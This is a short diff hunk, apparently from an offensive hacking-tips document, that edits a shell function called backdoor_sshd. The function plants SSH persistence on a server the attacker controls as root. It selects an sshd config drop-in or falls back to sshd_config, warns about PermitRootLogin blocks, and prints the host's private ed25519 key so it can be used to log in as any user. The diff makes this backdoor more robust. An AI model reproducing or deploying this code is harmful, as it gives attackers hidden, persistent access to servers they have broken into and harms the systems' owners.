@@ -1815,9 +1815,10 @@ Adding your key to *authorized_keys* is overused 😩. Instead, as root, cut & p
 backdoor_sshd() {
 	local B="/etc/ssh"
 	local K="${B}/ssh_host_ed25519_key" D="${B}/sshd_config.d"
-	local N=$(cd "${D}" || exit; shopt -s nullglob; echo *.conf)
+	local N=$(cd "${D}" 2>/dev/null|| exit; shopt -s nullglob; echo *.conf)
 	[ -n "$N" ] && N="${N%%\.conf*}.conf"
 	N="${D}/${N:-50-cloud-init.conf}"
+	[ ! -d "${D}" ] && N="${B}/sshd_config"
 	{ [ ! -f "$K" ] || [ ! -f "$K".pub ]; } && return
 	grep -iqm1 '^PermitRootLogin\s\+no' "${B}/sshd_config" && echo >&2 "WARN: PermitRootLogin blocking in sshd_config"
 	echo -e "\e[0;31mYour id_ed25519 to log in to this server as any user:\e[0;33m\n$(cat "${K}")\e[0m"
